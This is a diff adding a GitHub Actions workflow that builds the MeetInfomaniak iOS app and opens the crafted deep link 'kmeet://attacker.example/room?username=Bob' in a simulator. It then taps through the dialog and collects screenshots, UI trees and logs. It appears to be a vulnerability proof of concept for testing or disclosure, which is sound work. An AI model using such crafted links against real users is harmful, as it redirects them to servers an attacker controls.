@@ -1,0 +1,85 @@
+name: kmeet-probe7
+on: workflow_dispatch
+
+jobs:
+  probe:
+    runs-on: macos-latest
+    timeout-minutes: 180
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Boot simulator
+        run: |
+          UDID=$(xcrun simctl list devices available | grep -m1 -i "iPhone 16" | sed -E 's/.*\(([0-9A-Fa-f-]{36})\).*/\1/')
+          [ -z "$UDID" ] && UDID=$(xcrun simctl list devices available | grep -m1 -i "iPhone" | sed -E 's/.*\(([0-9A-Fa-f-]{36})\).*/\1/')
+          echo "UDID=$UDID" >> "$GITHUB_ENV"
+          xcrun simctl boot "$UDID" || true
+          xcrun simctl bootstatus "$UDID" -b || true
+
+      - name: Build
+        run: |
+          set -o pipefail
+          xcodebuild -project MeetInfomaniak.xcodeproj -scheme MeetInfomaniak -configuration Debug \
+            -derivedDataPath "$PWD/build" -destination "platform=iOS Simulator,id=$UDID" build 2>&1 | tail -15
+
+      - name: Install app
+        run: |
+          APP=$(find "$PWD/build" -name "*.app" -maxdepth 8 | grep -vi "appex\|AppClip" | head -1)
+          echo "app=$APP"; test -n "$APP" || exit 1
+          xcrun simctl install "$UDID" "$APP"
+
+      - name: Install idb (UI automation)
+        run: |
+          brew install idb-companion >/dev/null 2>&1 || brew install facebook/fb/idb-companion >/dev/null 2>&1 || echo "brew idb failed"
+          pip3 install --quiet fb-idb 2>&1 | tail -2 || true
+          which idb || echo "idb CLI missing"
+          idb list-targets | head -5 || true
+
+      - name: Open deep link and dump dialog tree
+        run: |
+          idb_companion --udid "$UDID" > companion.log 2>&1 &
+          sleep 6
+          xcrun simctl openurl "$UDID" "kmeet://attacker.example/room?username=Bob"
+          sleep 5
+          echo "=== BEFORE TAP: accessibility tree ==="
+          idb ui describe-all --udid "$UDID" > tree_before.json 2>&1 || echo "describe-all failed"
+          grep -iE "open|kmeet|attacker|url" tree_before.json | head -20 || true
+          xcrun simctl io "$UDID" screenshot 30-dialog.png || true
+
+      - name: Tap Open then capture app screen tree
+        run: |
+          COORDS=$(grep -i '"Open"' tree_before.json | head -1 | sed -E 's/.*"frame" : \{[^}]*"x" : ([0-9.]+),[^}]*"y" : ([0-9.]+).*"width" : ([0-9.]+),[^}]*"height" : ([0-9.]+).*/\1 \2 \3 \4/' || true)
+          echo "coords=$COORDS"
+          if [ -n "$COORDS" ]; then
+            set -- $COORDS
+            X=$(awk "BEGIN{print $1+$3/2}"); Y=$(awk "BEGIN{print $2+$4/2}")
+            echo "tapping $X $Y"; idb ui tap --udid "$UDID" "$X" "$Y" || echo "tap failed"
+          else
+            echo "no coords parsed, tapping fallback point"; idb ui tap --udid "$UDID" 253 443 || true
+          fi
+          sleep 8
+          xcrun simctl io "$UDID" screenshot 40-after-open.png || true
+          echo "=== AFTER TAP: accessibility tree ==="
+          idb ui describe-all --udid "$UDID" > tree_after.json 2>&1 || true
+          grep -iE "attacker|kmeet|join|room|username|server|config|error|Bob" tree_after.json | head -30 || true
+          sleep 8
+          xcrun simctl io "$UDID" screenshot 50-after-open-late.png || true
+          idb ui describe-all --udid "$UDID" > tree_after2.json 2>&1 || true
+
+      - name: Logs
+        run: |
+          xcrun simctl spawn "$UDID" log show --last 4m --style compact --predicate 'processImagePath CONTAINS "MeetInfomaniak"' > applog.txt 2>&1 || true
+          echo "=== attacker.example ==="; grep -i "attacker.example" applog.txt | head -20 || echo none
+          echo "=== jitsi ==="; grep -iE "jitsi|config|conference" applog.txt | head -20 || true
+
+      - name: Upload
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: kmeet-evidence7
+          path: |
+            *.png
+            *.json
+            applog.txt
+            companion.log
+          if-no-files-found: warn
